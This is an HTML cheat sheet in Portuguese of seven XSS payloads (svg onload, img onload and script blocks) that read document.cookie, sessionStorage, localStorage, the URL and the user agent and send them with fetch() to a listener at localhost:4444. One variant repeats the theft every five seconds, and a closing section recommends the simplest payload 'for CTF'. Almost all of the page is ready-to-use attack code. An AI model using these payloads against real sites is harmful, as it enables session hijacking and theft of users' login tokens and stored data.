<!DOCTYPE html>
<html>
<head>
    <title>XSS - Capturando TODOS os Cookies</title>
</head>
<body>

<h2>Payloads XSS para capturar TODOS os cookies do navegador</h2>

<h3>🍪 Método 1: document.cookie (cookies do domínio atual)</h3>
<p><strong>Captura:</strong> Todos os cookies do domínio atual que são acessíveis via JavaScript</p>
<textarea rows="1" cols="100">
<svg onload="fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(document.cookie)}`)"></svg>
</textarea>

<h3>🍪 Método 2: Iterando por todos os cookies manualmente</h3>
<p><strong>Captura:</strong> Parse individual de cada cookie</p>
<textarea rows="5" cols="100">
<script>
const cookies = document.cookie.split(';').map(c => c.trim());
const allCookies = cookies.join('|');
fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(allCookies)}`);
</script>
</textarea>

<h3>🍪 Método 3: Cookies + SessionStorage + LocalStorage</h3>
<p><strong>Captura:</strong> Cookies + dados de storage do navegador</p>
<textarea rows="8" cols="100">
<script>
const data = {
  cookies: document.cookie,
  sessionStorage: JSON.stringify(sessionStorage),
  localStorage: JSON.stringify(localStorage)
};
fetch(`http://localhost:4444/debug-cookie?data=${encodeURIComponent(JSON.stringify(data))}`);
</script>
</textarea>

<h3>🍪 Método 4: Função completa de extração</h3>
<p><strong>Captura:</strong> Todos os cookies formatados individualmente</p>
<textarea rows="10" cols="100">
<script>
function getAllCookies() {
  const cookies = {};
  document.cookie.split(';').forEach(cookie => {
    const [name, value] = cookie.split('=').map(c => c.trim());
    if (name) cookies[name] = value || '';
  });
  return cookies;
}
const allCookies = getAllCookies();
fetch(`http://localhost:4444/debug-cookie?cookies=${encodeURIComponent(JSON.stringify(allCookies))}`);
</script>
</textarea>

<h3>🍪 Método 5: SVG onload com múltiplos dados</h3>
<p><strong>Captura:</strong> Cookies + informações do navegador</p>
<textarea rows="1" cols="100">
<svg onload="fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(document.cookie)}&url=${encodeURIComponent(location.href)}&ua=${encodeURIComponent(navigator.userAgent)}`)"></svg>
</textarea>

<h3>🍪 Método 6: IMG onload com dados completos</h3>
<p><strong>Captura:</strong> Máxima informação possível</p>
<textarea rows="6" cols="100">
<img src=x onload="
const info = {
  cookies: document.cookie,
  url: location.href,
  referrer: document.referrer,
  userAgent: navigator.userAgent
};
fetch('http://localhost:4444/debug-cookie?data=' + encodeURIComponent(JSON.stringify(info)));
">
</textarea>

<h3>🍪 Método 7: Captura periódica (para cookies que mudam)</h3>
<p><strong>Captura:</strong> Cookies a cada 5 segundos</p>
<textarea rows="4" cols="100">
<script>
setInterval(() => {
  fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(document.cookie)}&time=${Date.now()}`);
}, 5000);
</script>
</textarea>

<hr>

<h3>🔍 Tipos de cookies que são capturados:</h3>
<ul>
    <li>✅ <strong>Cookies de sessão:</strong> sessionid, auth_token, etc.</li>
    <li>✅ <strong>Cookies de autenticação:</strong> login cookies, JWT tokens em cookies</li>
    <li>✅ <strong>Cookies de preferências:</strong> idioma, tema, configurações</li>
    <li>✅ <strong>Cookies de tracking:</strong> analytics, advertising IDs</li>
    <li>❌ <strong>HttpOnly cookies:</strong> NÃO são acessíveis via JavaScript (por segurança)</li>
    <li>❌ <strong>Cookies de outros domínios:</strong> Same-origin policy impede acesso</li>
</ul>

<h3>⚠️ Limitações importantes:</h3>
<ul>
    <li><strong>HttpOnly:</strong> Cookies marcados como HttpOnly não aparecem em document.cookie</li>
    <li><strong>Secure:</strong> Cookies Secure só funcionam em HTTPS</li>
    <li><strong>SameSite:</strong> Políticas SameSite podem limitar acesso</li>
    <li><strong>Domain:</strong> Só acessa cookies do domínio atual e subdomínios</li>
</ul>

<h3>🎯 Para CTF - Método mais eficaz:</h3>
<p><strong>Use o Método 1 (mais simples):</strong></p>
<code>&lt;svg onload="fetch(`http://localhost:4444/debug-cookie?cookie=${encodeURIComponent(document.cookie)}`)"&gt;&lt;/svg&gt;</code>

<p><strong>Para captura mais detalhada, use o Método 4:</strong></p>
<p>Ele organiza os cookies em um objeto JSON, facilitando a análise.</p>

</body>
</html>